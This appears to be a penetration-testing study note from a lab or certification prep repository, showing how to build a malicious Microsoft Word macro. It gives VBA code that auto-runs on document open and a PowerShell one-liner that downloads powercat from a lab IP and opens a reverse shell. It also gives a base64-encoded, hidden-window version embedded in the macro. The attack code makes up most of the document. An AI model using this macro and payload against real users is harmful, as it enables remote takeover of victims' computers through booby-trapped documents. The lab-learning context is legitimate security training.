# Word Attack
<img width="1024" height="1024" alt="Husky hacker using M365 to hack a computer" src="https://github.com/user-attachments/assets/4ecd34f5-2ccd-4128-a9b5-69dc3d30fa1e" />

## Note
This isn't necessarily on the test I saw, but in proving grounds, though. Still great to learn. 

## Prep work:
https://attack.mitre.org/techniques/T1553/005/

https://support.microsoft.com/en-us/office/what-is-protected-view-d6f09ac7-e6b9-4495-8e43-2bbcdbcb6653

You basically want your user to unblock the content, and you will need to install M365. 

Create the macro by going to View --> Macros

Then drop down, choose mymarco --> Create

Your code should look like this:
```
Sub MyMacro()
'
' MyMacro Macro
'
'

End Sub
```

Gets powershell open:

```
Sub AutoOpen()

  MyMacro
  
End Sub

Sub Document_Open()

  MyMacro
  
End Sub

Sub MyMacro()

  CreateObject("Wscript.Shell").Run "powershell"
  
End Sub
```
Payload:
```
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c $target -p 4444 -e powershell
```
Then encode with base 64
```
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
    ...
        Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
        Str = Str + "A== "

    CreateObject("Wscript.Shell").Run Str
End Sub
```
Check listener and instant reverse shell 
